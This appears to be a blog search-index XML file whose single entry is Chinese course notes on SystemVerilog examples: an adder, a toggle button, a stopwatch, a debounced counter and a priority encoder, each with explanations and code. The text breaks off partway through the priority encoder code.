<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>计算机组成原理 笔记4</title>
      <link href="/2023/10/02/systemverilog-shi-li/"/>
      <url>/2023/10/02/systemverilog-shi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="SystemVerilog实例"><a href="#SystemVerilog实例" class="headerlink" title="SystemVerilog实例"></a>SystemVerilog实例</h1><blockquote><p><span class="github-emoji"><span>❓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2753.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> A Hard Journey…</p></blockquote><h2 id="加法器"><a href="#加法器" class="headerlink" title="加法器"></a>加法器</h2><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>实现一个 2 位加法器: 输入两个非负整数, 输出这两个数的和.</p><p>输入: </p><ol><li><code>a</code>: 宽度为 2, 表示输入的第一个非负整数;</li><li><code>b</code>: 宽度为 2, 表示输入的第二个非负整数.</li></ol><p>输出: </p><ol><li><code>c</code>: 宽度为 2, 表示 <code>a + b</code>, 溢出的部分舍弃.</li></ol><h3 id="电路"><a href="#电路" class="headerlink" title="电路"></a>电路</h3><p>对于这一类<strong>输出仅随着输入变化而变化</strong>的信号, 通常使用<strong>组合逻辑</strong>来实现. 特点是输出完全依赖于输入, 没有内部状态, 和时间无关. </p><p>根据真值表, 可以得到输出与输入的关系 (<code>a_0</code> 表示 <code>a</code> 的最低位). 电路图如下: </p><p><img src="/pic/193.svg" alt=""></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>实际上直接写 <code>a + b</code> 就可以了, EDA 工具会自动完成逻辑转换. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> add2 <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">assign</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个很容易犯的错误是在 <code>output wire [1:0] c</code> 后面多写了一个逗号. 不要把这里的 <code>assign c = a + b</code> 理解为赋值, 而是把它看成信号的连接: 通过一系列的逻辑门, 计算得到 <code>a + b</code> 的结果, 再把结果连接到输出信号 <code>c</code> 上.</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>回顾上面的电路, 最大的特点是<strong>输入一变化, 输出就跟着变</strong>, 并且与时间无关, 这种电路称为<strong>组合电路</strong> (<strong>组合逻辑电路</strong>). </p><h2 id="按钮开关"><a href="#按钮开关" class="headerlink" title="按钮开关"></a>按钮开关</h2><h3 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h3><p>实现一个控制台灯的按钮开关: 按下开关的时候, 灯会亮起来; 再次按下开关的时候, 灯就熄灭了. </p><p>输入: </p><ol><li><code>button</code>: 1 表示按钮被按下, 0 表示按钮处于弹起状态.</li></ol><p>输出: </p><ol><li><code>light</code>: 1 表示灯亮起, 0 表示灯熄灭.</li></ol><h3 id="电路-1"><a href="#电路-1" class="headerlink" title="电路"></a>电路</h3><p><code>light</code> 输出与它本身的历史状态有关, 并且正好是取反的关系. 如果依然采用组合逻辑来实现, 写出形如 <code>light &lt;= ~light;</code> 的代码, 对应的电路就出现了环路, 此时 <code>light</code> 会不断在 <code>0</code> 和 <code>1</code> 之间震荡.</p><p>这一类<strong>输出与历史状态相关</strong>, 并且<strong>输出在某个信号的上升沿变化</strong>的信号, 通常使用<strong>时序逻辑</strong>来实现. 把 <code>button</code> 连接到触发器的 <code>C</code> 端口, 就实现了上升沿触发的目的; 为了实现每次触发, 让输出的结果取反, 可以把触发器的 <code>Q</code> 经过一个非门再连接到触发器的 <code>D</code> 端口: </p><p><img src="/pic/194.svg" alt=""></p><p>这个电路也成了一个环, 引入触发器的作用, 使得只有在时钟上升沿时, 触发器的输入 D 会引发输出 Q 的变化, 而当时钟上升沿结束以后, 输出 Q 也许会导致输入 D 变化, 但是输出 Q 是稳定不变的, 因此不会出现循环振荡. </p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>时序逻辑里, 需要显式的声明一个寄存器 (对应电路里的触发器), 并<strong>严格</strong>把信号<strong>连接</strong>到触发器的输入 D 端口. </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> button <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> light<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> light_reg<span class="token punctuation">;</span><span class="token keyword">assign</span> light <span class="token operator">=</span> light_reg<span class="token punctuation">;</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> button<span class="token punctuation">)</span> <span class="token keyword">begin</span>  light_reg <span class="token operator">&lt;=</span> <span class="token operator">~</span>light_reg<span class="token punctuation">;</span><span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要显式声明一个触发器, 称为 <code>light_reg</code>, 然后采用 <code>assign light = light_reg</code> 语句把触发器的输出 Q 端口连接到输出信号 <code>light</code> 上. 接下来实现 <code>light_reg</code> 在 <code>button</code> 上升沿时, 将当前的值取反.</p><p>这里把 <code>light_reg</code> 的输出 Q 经过非门连接到 <code>light_reg</code> 的输入 D 中. 换句话说, 出现在 <code>&lt;=</code> 右侧的都是触发器的输出 Q 端口, 而出现在 <code>&lt;=</code> 左侧的都是触发器的输入 D 端口. 这里的 <code>&lt;=</code> 要理解为信号的连接, 而不是软件编程中的赋值.</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>时序逻辑电路和组合逻辑电路最大的区别在于可以<strong>记录历史, 并且在一定的条件 (输入信号 C 的上升沿) 下触发更新</strong> . 根据这个特点, 我们就可以保存状态, 在上升沿事件的“带领”下更新内部状态.</p><h2 id="秒表"><a href="#秒表" class="headerlink" title="秒表"></a>秒表</h2><h3 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h3><p>设计一个秒表: 输出一个数字, 每秒加一; 按下复位按钮恢复到零. </p><p>输入: </p><ol><li><code>reset</code>: 1 表示复位按钮被按下, 需要清零; 0 表示不需要清零.</li><li><code>clock</code>: 频率为 1MHz 的时钟.</li></ol><p>输出: </p><ol><li><code>timer</code>: 4 位的数字, 表示目前经过的秒数.</li></ol><p>为了实现秒表, 需要外部的时钟连接到电路的输入 <code>clock</code> 中, 可以在内部逻辑中, 每一次时钟上升沿给计数器加一, 当计数器加到 1,000,000 次就知道经过了 1s 时间. </p><h3 id="波形"><a href="#波形" class="headerlink" title="波形"></a>波形</h3><p>秒表每秒输出都会加一, 说明内部需要保存状态, 需要用<strong>时序逻辑</strong>来实现这一部分功能. 可以用一个寄存器 <code>timer_reg</code> 来保存当前的秒数, 把寄存器的输出连接到 <code>timer</code> 输出上, 只要保证每 1s 中让 <code>timer_reg</code> 加一即可. </p><p>如何实现每 1s 让 <code>timer_reg</code> 加一? 上面引入了一个频率为 1MHz 的时钟, 每 1us 都有一次时钟上升沿, 为了记忆经过了多少次上升沿又是一个状态, 用一个寄存器 <code>counter_reg</code> 来保存当前经过了多少次上升沿.</p><p>每次上升沿 <code>counter_reg</code> 加一, 当加到 1,000,000 时给 <code>timer_reg</code> 加一, 同时让 <code>counter_reg</code> 恢复到 0, 这样就实现了秒表的计时功能. </p><p>需求里面的复位按钮有两种实现方法: </p><ol><li>按下按钮, 输出变成 0, 符合输入一变输出立即跟着变的特点, 所以可以用<strong>组合逻辑</strong> 实现: <code>timer = reset ? 0 : timer_reg</code>; 在时钟上升沿, 如果发现 <code>reset == 1</code>, 设置 <code>timer_reg = 0</code> 和 <code>counter_reg = 0</code>, 松开按钮时会从 0 开始计时. </li><li>按下按钮, 在时钟上升沿如果发现 <code>reset == 1</code>, 就设置 <code>timer_reg = 0</code> 和 <code>counter_reg = 0</code>; 从下一个周期开始, 输出的 <code>timer = timer_reg</code> 就变成了 0.</li></ol><h3 id="电路-2"><a href="#电路-2" class="headerlink" title="电路"></a>电路</h3><p>两组寄存器 <code>timer_reg</code> 和 <code>counter_reg</code>. <code>counter_reg</code> 在每个 <code>clock</code> 上升沿进行更新, <code>timer_reg</code> 在每个 <code>clock</code> 的上升沿进行更新, 这些 “可能” 在电路上对应用组合逻辑实现的选择器. 最后把 <code>timer_reg</code> 的输出连接到 <code>timer</code> 输出即可.</p><p><img src="/pic/195.svg" alt=""></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> timer <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> timer_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> counter_reg<span class="token punctuation">;</span>  <span class="token comment">// sequential</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      timer_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>counter_reg <span class="token operator">==</span> <span class="token number">20'd999999</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>        timer_reg <span class="token operator">&lt;=</span> timer_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        counter_reg <span class="token operator">&lt;=</span> <span class="token number">20'b0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        counter_reg <span class="token operator">&lt;=</span> counter_reg <span class="token operator">+</span> <span class="token number">20'b1</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token comment">// combinatorial</span>  <span class="token keyword">assign</span> timer <span class="token operator">=</span> timer_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来按照上面的思路来实现 <code>timer_reg</code> 和 <code>counter_reg</code> 的逻辑. 由于二者的判断是类似的, 可以直接合并起来. 上面的代码中, 语义上是<strong>当 XX 条件发生时, 向 YY 寄存器写入 ZZ</strong>, 实际电路则是 <code>ZZ &lt;= XX ? YY : ZZ</code>, 如果所有写入的条件都不满足, 则保留原来的状态.</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>经过这个例子, 我们学会了如何用 <code>if-then-else</code> 的方式更新寄存器, 而不用手动去写 <code>ZZ = XX ? YY : ZZ</code> 的代码.</p><h2 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h2><h3 id="需求-3"><a href="#需求-3" class="headerlink" title="需求"></a>需求</h3><p>设计一个计数器: 一个计数按钮, 每按一次计数加一; 一个复位按钮, 按下时计数恢复到零; 同时输出两位十进制的数, 显示目前按了多少次计数按钮. </p><p>输入信号: </p><ol><li><code>clock</code>: 频率为 1MHz 的时钟.</li><li><code>reset</code>: 1 表示复位按钮被按下, 0 表示没有按下.</li><li><code>button</code>: 1 表示计数按钮被按下, 0 表示没有按下.</li></ol><p>输出信号: </p><ol><li><code>ones</code>: 输出次数的个位数, 4 位.</li><li><code>tens</code>: 输出次数的十位数, 4 位.</li></ol><h3 id="波形-1"><a href="#波形-1" class="headerlink" title="波形"></a>波形</h3><p>能否在 <code>button</code> 的时钟上升沿触发, 让寄存器加一? 由于按钮的本身特性, 按下按钮的几 ms 内是不稳定的, 不断在 <code>0</code> 和 <code>1</code> 之间抖动, 最后才趋向稳定. </p><p>为了消除这个抖动的影响 (Debounce), 可以记录最近若干次 <code>button</code> 的历史值, 如果连续一段时间都处于一个固定的值, 可以认为按钮处于这个状态.</p><p>计数器是一个内部状态, 需要用寄存器来实现. 能否把去抖以后的信号作为时钟信号来驱动? 如果可能的话, 尽量减少用非时钟信号作为上边沿触发, <strong>尽量把相关的时序逻辑都放在同一个时钟域中</strong>. 如果涉及不同时钟域之间的信号处理, 之后会介绍一些用于实现跨时钟域 (CDC) 的正确电路实现方法. <strong>建议只用一个时钟, 让这个时钟驱动所有的寄存器</strong>. </p><p>可以在时钟的上升沿来检测 <code>button_debounced</code> 从 <code>0</code> 变成了 <code>1</code>, 具体思路是: </p><ol><li>设置一个寄存器 <code>button_debounced_delay</code>, 相对 <code>button_debounced</code> 有一个周期的延迟;</li><li>当 <code>button_debounced == 1</code> 且 <code>button_debounced_delay == 0</code> 时, 就检测到了一个从 <code>0</code> 变成 <code>1</code> 的过程, 对计数器加一. </li></ol><h3 id="电路-3"><a href="#电路-3" class="headerlink" title="电路"></a>电路</h3><h4 id="模块化设计"><a href="#模块化设计" class="headerlink" title="模块化设计"></a>模块化设计</h4><p>代码主要有两部分, 一部分是消抖, 一部分是计数和输出逻辑. 消抖逻辑比较独立, 可以拆出来做成一部分电路, 然后连接到计数和输出逻辑部分.</p><p>消抖模块 (Debouncer) : </p><p>输入: </p><ol><li><code>clock</code>: 频率为 1MHz 的时钟.</li><li><code>reset</code>: 1 表示复位按钮被按下, 0 表示没有按下.</li><li><code>button</code>: 1 表示计数按钮被按下, 0 表示没有按下.</li></ol><p>输出: </p><ol><li><code>button_debounced</code>: 消抖后的计数按钮信号, 高有效.</li></ol><p>计数模块 (Counter) : </p><p>输入: </p><ol><li><code>clock</code>: 频率为 1MHz 的时钟.</li><li><code>reset</code>: 1 表示复位按钮被按下, 0 表示没有按下.</li><li><code>button_debounced</code>: 消抖后的计数按钮信号, 高有效.</li></ol><p>输出: </p><ol><li><code>ones</code>: 输出次数的个位数, 4 位.</li><li><code>tens</code>: 输出次数的十位数, 4 位.</li></ol><p><img src="/pic/196.svg" alt=""></p><h4 id="消抖模块"><a href="#消抖模块" class="headerlink" title="消抖模块"></a>消抖模块</h4><p>需要记录下历史输入, 才可以判断是否 10,000 个周期都保持稳定. 用 10,000 个 1 位的寄存器有些浪费, 可以用一个寄存器来记录目前稳定了多少个周期. </p><ol><li>寄存器 <code>last_button_reg</code> 记录上一个周期 <code>button</code>.</li><li>寄存器 <code>counter_reg</code> 用来保存一个计数, 当 <code>button == last_button_reg</code> 时, 说明 <code>button</code> 保持稳定, 那么 <code>counter_reg = counter_reg + 1</code>; 否则清零重新计数</li><li>寄存器 <code>button_debounced_reg</code> 保存当前输出的消抖结果, 当 <code>counter_reg = 10000</code> 的时候, 更新 <code>button_debounced_reg = last_button_reg</code>. </li></ol><p>最后把 <code>button_debounced_reg</code> 连接到 <code>button_debounced</code> 输出. </p><h4 id="计数模块"><a href="#计数模块" class="headerlink" title="计数模块"></a>计数模块</h4><p>接收来自消抖模块的输出 <code>button_debounced</code>, 检测到从 <code>0</code> 变成 <code>1</code> 的时候计数器加一. 能不能用一个完整的寄存器保存计数, 输出设置 <code>ones = counter_reg % 10</code> 和 <code>tens = counter_reg / 10</code>? 不建议, 因为除法和取模运算会耗费大量的逻辑门, 并且延迟比较大. 如果位数更多, 产生的电路复杂度和延迟可能是不可接受的. 考虑到这里每次对 <code>counter_reg</code> 的操作只有加一和清零, 可以添加 <code>ones_reg</code> 和 <code>tens_reg</code> 寄存器, 实现加一和清零的操作, 并且手动处理进位.</p><p>用一个寄存器检测按下的计数按钮, 即 <code>button_debounced</code> 从 <code>0</code> 变成 <code>1</code>: </p><ol><li>寄存器 <code>button_debounced_reg</code> 保存上一周期的 <code>button_debounced</code>.</li><li>如果 <code>button_debounced == 1 &amp;&amp; button_debounced_reg == 0</code>, 说明检测到了从 <code>0</code> 变成了 <code>1</code>.</li></ol><p>最后是 <code>ones_reg</code> 和 <code>tens_reg</code>, 连接到输出的 <code>ones</code> 和 <code>tens</code> 信号即可. </p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><p>首先是消抖电路: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> debouncer <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> button_debounced<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> last_button_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> counter_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> button_debounced_reg<span class="token punctuation">;</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      last_button_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>      counter_reg <span class="token operator">&lt;=</span> <span class="token number">16'b0</span><span class="token punctuation">;</span>      button_debounced_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      last_button_reg <span class="token operator">&lt;=</span> button<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>button <span class="token operator">==</span> last_button_reg<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>counter_reg <span class="token operator">==</span> <span class="token number">16'd10000</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>          button_debounced_reg <span class="token operator">&lt;=</span> last_button_reg<span class="token punctuation">;</span>        <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>          counter_reg <span class="token operator">&lt;=</span> counter_reg <span class="token operator">+</span> <span class="token number">16'b1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>        counter_reg <span class="token operator">&lt;=</span> <span class="token number">16'b0</span><span class="token punctuation">;</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> button_debounced <span class="token operator">=</span> button_debounced_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着是计数器部分: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> counter <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button_debounced<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> ones<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> tens<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> ones_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> tens_reg<span class="token punctuation">;</span>  <span class="token keyword">logic</span> button_debounced_reg<span class="token punctuation">;</span>  <span class="token important">always_ff @</span> <span class="token punctuation">(</span><span class="token keyword">posedge</span> clock<span class="token punctuation">)</span> <span class="token keyword">begin</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>reset<span class="token punctuation">)</span> <span class="token keyword">begin</span>      ones_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      tens_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>      button_debounced_reg <span class="token operator">&lt;=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span>    <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>      button_debounced_reg <span class="token operator">&lt;=</span> button_debounced<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>button_debounced <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>button_debounced_reg<span class="token punctuation">)</span> <span class="token keyword">begin</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ones_reg <span class="token operator">==</span> <span class="token number">4'd9</span><span class="token punctuation">)</span> <span class="token keyword">begin</span>          ones_reg <span class="token operator">&lt;=</span> <span class="token number">4'b0</span><span class="token punctuation">;</span>          tens_reg <span class="token operator">&lt;=</span> tens_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span> <span class="token keyword">else</span> <span class="token keyword">begin</span>          ones_reg <span class="token operator">&lt;=</span> ones_reg <span class="token operator">+</span> <span class="token number">4'b1</span><span class="token punctuation">;</span>        <span class="token keyword">end</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span>  <span class="token keyword">assign</span> ones <span class="token operator">=</span> ones_reg<span class="token punctuation">;</span>  <span class="token keyword">assign</span> tens <span class="token operator">=</span> tens_reg<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后再用一个顶层 <code>module</code> 把两个模块合起来: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> counter_top <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> clock<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> reset<span class="token punctuation">,</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> button<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> ones<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> tens<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">wire</span> button_debounced<span class="token punctuation">;</span>  debouncer debouncer_component <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">clock</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">button</span><span class="token punctuation">(</span>button<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">button_debounced</span><span class="token punctuation">(</span>button_debounced<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  counter counter_component <span class="token punctuation">(</span>    <span class="token punctuation">.</span><span class="token function">clock</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">button_debounced</span><span class="token punctuation">(</span>button_debounced<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">ones</span><span class="token punctuation">(</span>ones<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token function">tens</span><span class="token punctuation">(</span>tens<span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>button_debounced</code> 是两个内部模块之间的, 所以声明了一个 <code>wire</code> 把两个模块的输入输出连起来, 其他信号则是直接连接到顶层模块的输入输出信号. </p><h2 id="无状态仲裁器-优先级编码器"><a href="#无状态仲裁器-优先级编码器" class="headerlink" title="无状态仲裁器 (优先级编码器)"></a>无状态仲裁器 (优先级编码器)</h2><h3 id="需求-4"><a href="#需求-4" class="headerlink" title="需求"></a>需求</h3><p>设计一个仲裁器: 假想多个用户同时访问同一个资源, 但是资源同时只能给一个用户使用, 这时需要使用一个仲裁器, 选择出一个幸运儿, 其他用户则需要等待. 假设资源的访问是 “立即” 完成的, 资源正在使用的时候, 使用权不会被其他用户抢走.</p><p>输入: </p><ol><li><code>request</code>: 宽度为 4, 每一位 1 表示对应的用户请求访问资源, 0 表示不请求.</li></ol><p>输出: </p><ol><li><code>valid</code>: 1 表示有用户请求访问资源, 0 表示无用户请求访问资源.</li><li><code>user</code>: 宽度为 2, 如果有用户请求访问资源时, 输出获得资源的用户的编号.</li></ol><h3 id="电路-4"><a href="#电路-4" class="headerlink" title="电路"></a>电路</h3><p>仲裁器的输出完全由输入决定, 没有内部状态, 所以可以用<strong>组合逻辑</strong>来实现.  <code>valid</code> 信号比较简单, 直接把所有输入用或门连接在一起即可. 如何找到请求的用户里, 编号最小的那一个? 可以分情况讨论: </p><ol><li><code>request=0000</code>, 输出的 <code>user</code> 可以是任意值.</li><li><code>request=???1</code>, 此时 <code>user=0, valid=1</code>.</li><li><code>request=??10</code>, 此时 <code>user=1, valid=1</code>.</li><li><code>request=?100</code>, 此时 <code>user=2, valid=1</code>.</li><li><code>request=1000</code>, 此时 <code>user=3, valid=1</code>.</li></ol><p>上面五个条件遍历了所有可能的情况. 在实现组合逻辑的时候, 一定要<strong>考虑所有情况, 并且每个情况下每个信号都要得到一个结果</strong>, 否则不可避免会引入锁存器.</p><p><img src="/pic/197.svg" alt=""></p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> priority_encoder <span class="token punctuation">(</span>  <span class="token keyword">input</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> request<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> valid<span class="token punctuation">,</span>  <span class="token keyword">output</span> <span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">logic</span> valid_comb<span class="token punctuation">;</span>  <span class="token keyword">logic</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token 